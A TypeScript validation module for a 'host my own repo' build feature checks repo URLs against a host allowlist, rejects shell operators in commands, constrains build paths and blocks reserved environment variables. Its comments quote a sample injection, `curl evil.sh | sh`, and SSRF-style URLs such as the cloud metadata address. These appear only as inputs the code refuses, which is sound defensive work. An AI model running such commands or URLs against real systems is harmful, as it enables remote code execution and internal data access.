import { z } from "zod";
import { env } from "../env.js";

/**
 * Everything that decides whether a "host my own repo" request is
 * acceptable *before* any of it reaches a subprocess.
 *
 * The template pipeline builds code we wrote. This one builds code a
 * stranger pushed, on our machine, so the boundary has to be drawn in one
 * readable place rather than scattered across the route and the builder:
 *
 * - the repo URL is checked against a host allowlist (`GIT_ALLOWED_HOSTS`),
 *   which is what keeps `git clone` from being an SSRF primitive;
 * - the install/build commands are parsed into an argv array here and run
 *   with no shell at all, so `bun run build; curl evil.sh | sh` is a
 *   validation error rather than a second command;
 * - the build folder is a repo-relative subpath, re-checked against the
 *   real clone path at publish time (see git-build.service.ts);
 * - environment-variable names can't be the ones that would redirect the
 *   toolchain itself (PATH, NODE_OPTIONS, LD_PRELOAD, …).
 *
 * None of this makes running someone else's build script *safe* — that
 * needs a sandbox at the OS level. It makes the inputs honest: whatever
 * runs is the repo's own build, not something smuggled in through a field
 * that was only supposed to name one.
 */

export const DEFAULT_INSTALL_COMMAND = "bun install";
export const DEFAULT_BUILD_COMMAND = "bun run build";
export const DEFAULT_BUILD_DIR = "dist";

/** Bun only, by product decision — and `bunx` for the "no script in package.json" case. */
const ALLOWED_COMMAND_BINARIES = new Set(["bun", "bunx"]);

const MAX_ENV_VARS = 50;
const MAX_ENV_VALUE_CHARS = 8192;

/**
 * Names that steer the toolchain rather than the user's app. Setting any of
 * these would let a build redirect the interpreter, the package registry, or
 * the loader — which is a different thing from configuring a site, and the
 * one thing this field must not become.
 */
const RESERVED_ENV_KEYS = new Set([
	"PATH",
	"HOME",
	"SHELL",
	"IFS",
	"PWD",
	"OLDPWD",
	"TMPDIR",
	"TEMP",
	"TMP",
	"USER",
	"LOGNAME",
	"LD_PRELOAD",
	"LD_LIBRARY_PATH",
	"LD_AUDIT",
	"DYLD_INSERT_LIBRARIES",
	"DYLD_LIBRARY_PATH",
	"NODE_OPTIONS",
	"NODE_PATH",
	"BUN_BE_BUN",
]);

/** Prefixes with the same problem as the exact names above, for whole families of vars. */
const RESERVED_ENV_PREFIXES = ["BUN_", "GIT_", "SSH_", "NPM_CONFIG_", "npm_"];

export type GitSourceConfig = z.infer<typeof gitSourceSchema>;

export interface GitEnvVarInput {
	key: string;
	/** `undefined` means "keep whatever is stored for this key" — see the route. */
	value?: string;
}

/**
 * The wire shape of a repo-hosting config. Zod rather than hand-rolled
 * checks so failures come back through `toFieldErrors` as per-field
 * messages the form can render next to the input that caused them.
 */
export const gitSourceSchema = z.object({
	repoUrl: z
		.string()
		.trim()
		.min(1, "Enter the URL of a public git repository.")
		.max(500, "That repository URL is too long.")
		.transform((raw, ctx) => {
			const result = normalizeRepoUrl(raw);
			if (!result.ok) {
				ctx.addIssue({ code: "custom", message: result.message });
				return z.NEVER;
			}
			return result.value;
		}),
	branch: z
		.string()
		.trim()
		.max(255, "That branch name is too long.")
		.optional()
		.nullable()
		.transform((raw, ctx) => {
			if (!raw) return null; // "" and null alike mean "the repo's default branch"
			if (!isValidBranchName(raw)) {
				ctx.addIssue({ code: "custom", message: "That isn't a valid branch or tag name." });
				return z.NEVER;
			}
			return raw;
		}),
	installCommand: z
		.string()
		.trim()
		.max(300, "That install command is too long.")
		.optional()
		.transform((raw, ctx) => validateCommandField(raw, DEFAULT_INSTALL_COMMAND, "install", ctx)),
	buildCommand: z
		.string()
		.trim()
		.max(300, "That build command is too long.")
		.optional()
		.transform((raw, ctx) => validateCommandField(raw, DEFAULT_BUILD_COMMAND, "build", ctx)),
	buildDir: z
		.string()
		.trim()
		.max(200, "That build folder path is too long.")
		.optional()
		.transform((raw, ctx) => {
			const result = normalizeBuildDir(raw && raw.length > 0 ? raw : DEFAULT_BUILD_DIR);
			if (!result.ok) {
				ctx.addIssue({ code: "custom", message: result.message });
				return z.NEVER;
			}
			return result.value;
		}),
	env: z
		.array(
			z.object({
				key: z
					.string()
					.trim()
					.transform((raw, ctx) => {
						const result = validateEnvKey(raw);
						if (!result.ok) {
							ctx.addIssue({ code: "custom", message: result.message });
							return z.NEVER;
						}
						return result.value;
					}),
				// Absent (not empty) means "leave the stored value alone", which
				// is what lets the settings form round-trip secrets it was never
				// sent in the first place. An empty string is a real value.
				value: z
					.string()
					.max(MAX_ENV_VALUE_CHARS, `Values are limited to ${MAX_ENV_VALUE_CHARS} characters.`)
					.refine((v) => !v.includes("\0"), "Values can't contain null bytes.")
					.optional(),
			}),
		)
		.max(MAX_ENV_VARS, `You can set at most ${MAX_ENV_VARS} environment variables.`)
		.optional()
		.superRefine((entries, ctx) => {
			if (!entries) return;
			const seen = new Set<string>();
			for (const entry of entries) {
				if (seen.has(entry.key)) {
					ctx.addIssue({ code: "custom", message: `"${entry.key}" is listed more than once.` });
					return;
				}
				seen.add(entry.key);
			}
		}),
});

type Checked<T> = { ok: true; value: T } | { ok: false; message: string };

/**
 * Normalizes what a person actually pastes ("github.com/me/site",
 * "https://github.com/me/site.git", a URL with a trailing slash) into one
 * canonical `https://host/path` — and refuses everything that isn't a
 * public HTTPS clone URL on an allowed host.
 *
 * The refusals matter more than the normalization. `file:///etc`,
 * `ssh://…`, `https://user:token@…`, `http://169.254.169.254/…` and
 * `https://internal-git.corp/…` all reach `git clone` happily; each one
 * turns this feature into a way to read something that isn't the user's.
 */
export function normalizeRepoUrl(raw: string): Checked<string> {
	const trimmed = raw.trim();
	// A scheme-less "github.com/me/site" is what people paste most often;
	// anything with an explicit scheme is left alone so a bad one is
	// reported as a bad scheme rather than silently rewritten to https.
	const candidate = /^[a-z][a-z0-9+.-]*:\/\//i.test(trimmed) ? trimmed : `https://${trimmed}`;

	let url: URL;
	try {
		url = new URL(candidate);
	} catch {
		return { ok: false, message: "That doesn't look like a repository URL." };
	}

	if (url.protocol !== "https:") {
		return { ok: false, message: "Only https:// repository URLs are supported." };
	}
	if (url.username || url.password) {
		return {
			ok: false,
			message: "Remove the credentials from the URL — only public repositories can be hosted.",
		};
	}
	if (url.port && url.port !== "443") {
		return { ok: false, message: "Repository URLs can't specify a port." };
	}

	const host = url.hostname.toLowerCase();
	if (!env.GIT_ALLOWED_HOSTS.includes(host)) {
		return {
			ok: false,
			message: `Repositories can only be hosted from ${formatList(env.GIT_ALLOWED_HOSTS)}.`,
		};
	}

	const segments = url.pathname.split("/").filter(Boolean);
	if (segments.length < 2) {
		return { ok: false, message: "That URL doesn't point at a repository (expected …/owner/repo)." };
	}
	for (const segment of segments) {
		// `-` leading a segment is argv-injection shaped, `..` is traversal
		// shaped; neither appears in a real repository path.
		if (segment === "." || segment === ".." || segment.startsWith("-")) {
			return { ok: false, message: "That repository path isn't valid." };
		}
		if (!/^[A-Za-z0-9._-]+$/.test(segment)) {
			return { ok: false, message: "That repository path isn't valid." };
		}
	}

	// Query strings and fragments are never part of a clone URL — drop them
	// rather than passing something like `?upload-pack=…` through to git.
	return { ok: true, value: `https://${host}/${segments.join("/")}` };
}

/**
 * git's own rules, trimmed to the ones that matter here (see
 * `git check-ref-format`): no leading dash, no `..`, no control characters,
 * doesn't end in `.lock`.
 */
export function isValidBranchName(raw: string): boolean {
	if (!/^[A-Za-z0-9._/-]{1,255}$/.test(raw)) return false;
	if (raw.startsWith("-") || raw.startsWith("/") || raw.endsWith("/")) return false;
	if (raw.includes("..") || raw.includes("//")) return false;
	if (raw.endsWith(".lock") || raw.endsWith(".")) return false;
	return true;
}

/**
 * Splits a command into an argv array the way a shell would for the simple
 * cases, and refuses anything that would *need* a shell.
 *
 * That refusal is the point. The command never reaches `sh`: it's spawned
 * as argv (see git-build.service.ts), so `&&`, `;`, a pipe, a backtick or a
 * `$(…)` would either be passed to bun as a literal argument (confusing) or
 * work as an injection point the day someone adds a shell for convenience.
 * Saying "no" here keeps both from being possible.
 */
export function parseCommand(raw: string): Checked<string[]> {
	if (/[;&|<>`$\\\n\r]/.test(raw)) {
		return {
			ok: false,
			message: "Commands can't contain shell operators (; & | > < ` $ \\) — give one plain command.",
		};
	}

	const argv: string[] = [];
	// Quotes are supported because arguments with spaces are ordinary
	// ("bun run build:prod --outDir 'my dist'"); nothing else about a shell
	// is.
	const pattern = /"([^"]*)"|'([^']*)'|(\S+)/g;
	for (const match of raw.matchAll(pattern)) {
		argv.push(match[1] ?? match[2] ?? match[3] ?? "");
	}

	if (argv.length === 0) return { ok: false, message: "Enter a command." };

	const binary = argv[0] ?? "";
	if (!ALLOWED_COMMAND_BINARIES.has(binary)) {
		return {
			ok: false,
			message: `Commands must start with ${formatList([...ALLOWED_COMMAND_BINARIES])} — we build with Bun.`,
		};
	}

	return { ok: true, value: argv };
}

/**
 * The folder the build writes into, as a repo-relative subpath.
 *
 * The repository root is rejected on purpose: publishing it would copy
 * `.git` (the full history, including anything force-pushed away) and
 * `node_modules` onto the public web. Every Bun/Vite-shaped project writes
 * somewhere — `dist`, `build`, `out`, `.output/public` — so requiring a
 * subfolder costs nothing and closes that off.
 */
export function normalizeBuildDir(raw: string): Checked<string> {
	const cleaned = raw.trim().replace(/^\.\//, "").replace(/\/+$/, "").replace(/\\/g, "/");

	if (cleaned.length === 0 || cleaned === ".") {
		return {
			ok: false,
			message: "Point this at the folder your build writes into (e.g. dist), not the repository root.",
		};
	}
	if (cleaned.startsWith("/") || /^[A-Za-z]:/.test(cleaned)) {
		return { ok: false, message: "The build folder must be a path inside the repository." };
	}
	if (cleaned.split("/").some((segment) => segment === "." || segment === "..")) {
		return { ok: false, message: "The build folder can't step outside the repository." };
	}
	if (!/^[A-Za-z0-9._/-]+$/.test(cleaned)) {
		return { ok: false, message: "That build folder path isn't valid." };
	}
	return { ok: true, value: cleaned };
}

/** POSIX-shaped names only, minus the ones that would redirect the toolchain. */
export function validateEnvKey(raw: string): Checked<string> {
	const key = raw.trim();
	if (key.length === 0) return { ok: false, message: "Give the variable a name." };
	if (!/^[A-Za-z_][A-Za-z0-9_]{0,127}$/.test(key)) {
		return {
			ok: false,
			message: `"${key}" isn't a valid name — use letters, digits and underscores, starting with a letter or underscore.`,
		};
	}
	const upper = key.toUpperCase();
	if (RESERVED_ENV_KEYS.has(upper) || RESERVED_ENV_PREFIXES.some((p) => upper.startsWith(p.toUpperCase()))) {
		return { ok: false, message: `"${key}" is reserved by the build environment and can't be set.` };
	}
	return { ok: true, value: key };
}

function validateCommandField(
	raw: string | undefined,
	fallback: string,
	label: string,
	ctx: z.RefinementCtx,
): string {
	const value = raw && raw.length > 0 ? raw : fallback;
	const parsed = parseCommand(value);
	if (!parsed.ok) {
		ctx.addIssue({ code: "custom", message: `${capitalize(label)} command: ${parsed.message}` });
		return z.NEVER as never;
	}
	// Stored as the original string (that's what the user typed and what the
	// UI shows back); re-parsed into argv at build time by the same function.
	return value;
}

function capitalize(value: string): string {
	return value.charAt(0).toUpperCase() + value.slice(1);
}

function formatList(items: string[]): string {
	if (items.length <= 1) return items[0] ?? "";
	return `${items.slice(0, -1).join(", ")} or ${items[items.length - 1]}`;
}
